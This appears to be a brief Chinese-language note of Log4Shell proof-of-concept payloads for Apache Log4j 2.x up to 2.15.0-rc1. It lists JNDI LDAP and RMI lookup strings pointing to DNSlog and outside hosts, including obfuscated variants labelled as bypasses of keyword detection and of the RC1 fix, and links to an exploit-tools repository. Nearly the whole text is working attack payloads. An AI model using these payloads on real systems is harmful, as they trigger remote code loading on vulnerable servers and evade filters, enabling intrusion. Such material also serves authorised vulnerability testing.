- 对 Apache Log4j 2.x <= 2.15.0-rc1 有效
- ```
  poc:
  ${jndi:ldap://zxyjct.dnslog.cn/exp}
  
  ${${lower:j}ndi:${lower:l}dap://hk.xxx.xyz:3001/ } # 关键词检测绕过
  ${${::-j}ndi:${::-l}dap://hk.xxx.xyz:3001/} # 关键词检测绕过
  ${jndi:ldap://zxyjct.dnslog.cn/ exp} # RC1绕过/加个空格
  ${jndi:rmi://127.0.0.1:1099/ruwsfb}
  ```
- [文档](https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html)
- [测试工具](https://github.com/ilsubyeega/log4j2-exploits)
-